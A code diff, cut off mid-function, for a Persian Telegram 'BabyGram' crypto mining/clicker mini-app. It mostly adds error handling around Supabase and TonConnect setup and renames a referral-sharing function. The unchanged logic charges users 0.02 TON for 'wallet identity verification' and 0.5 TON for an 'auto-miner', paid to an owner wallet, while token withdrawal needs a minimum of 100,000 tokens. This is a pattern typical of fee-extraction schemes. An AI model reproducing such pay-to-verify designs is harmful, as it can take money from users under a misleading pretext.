@@ -248,10 +248,8 @@
         <div class="timer" id="countdown">00:00:00</div>
         <p id="status" style="font-size: 11px; color: #adb5bd; margin: 5px 0;">ظرفیت: انتخاب پاداش</p>
 
-        <!-- تایید هویت با هزینه 0.02 TON -->
         <button class="btn-verify" id="verifyBtn" onclick="verifyWalletWithFee()">🛡 تایید هویت کیف پول (0.02 TON)</button>
         <button class="btn-verified-done" id="verifiedDoneBtn">تایید هویت شده ✅ (ضریب 2x)</button>
-        
         <button class="btn-auto-upgrade" onclick="buyAutoMiner()">⚡️ خرید جمع‌کننده خودکار (0.5 TON)</button>
 
         <div class="holding-box">
@@ -266,7 +264,6 @@
             <button class="option-btn" id="opt24" onclick="setParams(24, 450, this)">۲۴ ساعته<br><small>⚡️ ۴۵۰ توکن</small></button>
         </div>
 
-        <!-- دکمه استخراج کاملاً قفل‌شده تا پایان تایمر -->
         <button class="btn-main" id="actionBtn" onclick="toggleMining()">شروع استخراج</button>
         <button class="btn-withdraw" id="withdrawBtn" onclick="withdrawTokens()">برداشت به کیف پول (حداقل ۱۰۰,۰۰۰)</button>
         
@@ -285,7 +282,7 @@
 
         <div class="task-box">
             <span id="refTitle" style="font-weight: bold; color: #fbbf24; font-size: 11px;">👥 دعوت از دوستان (+۵۰۰ توکن)</span><br>
-            <button class="btn-main" style="margin-top: 6px; font-size: 12px; padding: 6px;" onclick="getRefLink()">دریافت لینک دعوت آبی</button>
+            <button class="btn-main" style="margin-top: 6px; font-size: 12px; padding: 6px;" onclick="shareRefLink()">ارسال لینک دعوت (اشتراک‌گذاری)</button>
             
             <div style="margin-top: 8px; font-weight: bold; font-size: 11px; color: #4cc9f0;">دوستان دعوت‌شده (<span id="friendCount">0</span>):</div>
             <div class="friend-list" id="friendListContainer">
@@ -311,8 +308,12 @@
         const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind1eWNvb29xeXB2cmdveHlldHNtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTQ0Mzk2MDksImV4cCI6MjExMDAxNTYwOX0.ronYWbeEytYBB7hVOWDyhoPi6F1_LuQDUbR4gZl-TQ0';
         
         let supabaseClient = null;
-        if (window.supabase && window.supabase.createClient) {
-            supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
+        try {
+            if (window.supabase && typeof window.supabase.createClient === 'function') {
+                supabaseClient = window.supabase.createClient(supabaseUrl, supabaseKey);
+            }
+        } catch (e) {
+            console.error("Supabase init error:", e);
         }
 
         let userTelegramId = "guest_" + Math.floor(Math.random() * 1000000);
@@ -325,20 +326,24 @@
         }
 
         let tonConnectUI = null;
-        if (window.TON_CONNECT_UI) {
-            tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-                manifestUrl: 'https://raw.githubusercontent.com/BabyGramCoin/babygram-game/main/tonconnect-manifest.json',
-                actionsConfiguration: { twaReturnUrl: 'https://t.me/BabyGramClicker_bot' }
-            });
-            tonConnectUI.onStatusChange(walletInfo => {
-                if (walletInfo) {
-                    walletConnected = true;
-                    document.getElementById('walletBtn').innerText = currentLang === 'fa' ? "متصل شد ✅" : "Connected ✅";
-                } else {
-                    walletConnected = false;
-                    document.getElementById('walletBtn').innerText = currentLang === 'fa' ? "اتصال کیف پول" : "Connect Wallet";
-                }
-            });
+        try {
+            if (window.TON_CONNECT_UI) {
+                tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+                    manifestUrl: 'https://raw.githubusercontent.com/BabyGramCoin/babygram-game/main/tonconnect-manifest.json',
+                    actionsConfiguration: { twaReturnUrl: 'https://t.me/BabyGramClicker_bot' }
+                });
+                tonConnectUI.onStatusChange(walletInfo => {
+                    if (walletInfo) {
+                        walletConnected = true;
+                        document.getElementById('walletBtn').innerText = currentLang === 'fa' ? "متصل شد ✅" : "Connected ✅";
+                    } else {
+                        walletConnected = false;
+                        document.getElementById('walletBtn').innerText = currentLang === 'fa' ? "اتصال کیف پول" : "Connect Wallet";
+                    }
+                });
+            }
+        } catch (e) {
+            console.error("TonConnect init error:", e);
         }
 
         async function syncUserToDatabase() {
@@ -449,9 +454,13 @@
         }
 
         async function connectWallet() {
-            if (!tonConnectUI) return alert("در حال راه‌اندازی کیف پول...");
-            if (tonConnectUI.connected) await tonConnectUI.disconnect();
-            else await tonConnectUI.openModal();
+            try {
+                if (!tonConnectUI) return alert("در حال راه‌اندازی کیف پول...");
+                if (tonConnectUI.connected) await tonConnectUI.disconnect();
+                else await tonConnectUI.openModal();
+            } catch (err) {
+                console.error("Wallet error:", err);
+            }
         }
 
         async function verifyWalletWithFee() {
@@ -462,7 +471,7 @@
             try {
                 await tonConnectUI.sendTransaction({
                     validUntil: Math.floor(Date.now() / 1000) + 360,
-                    messages: [{ address: OWNER_WALLET, amount: "2000000" }] // 0.02 TON واقعی
+                    messages: [{ address: OWNER_WALLET, amount: "2000000" }]
                 });
                 walletVerified = true;
                 userHoldingTier = 2;
@@ -482,7 +491,7 @@
             try {
                 await tonConnectUI.sendTransaction({
                     validUntil: Math.floor(Date.now() / 1000) + 360,
-                    messages: [{ address: OWNER_WALLET, amount: "500000000" }] // 0.5 TON
+                    messages: [{ address: OWNER_WALLET, amount: "500000000" }]
                 });
                 alert("جمع‌کننده خودکار فعال شد!");
             } catch (e) { alert("تراکنش لغو شد."); }
@@ -501,11 +510,6 @@
             }, 2000);
         }
 
-        // لینک دعوت آبی و استاندارد برای تلگرام
-        function getRefLink() {
+        function shareRefLink() {
             const refLink = `https://t.me/BabyGramClicker_bot?start=${userTelegramId}`;
-            if (navigator.clipboard && navigator.clipboard.writeText) {
-                navigator.clipboard.writeText(refLink).then(() => {
-                    alert("لینک دعوت آبی شما کپی شد:\n\n" + refLink);
-                }).catch(() => {
-                    pr
+            if (window.
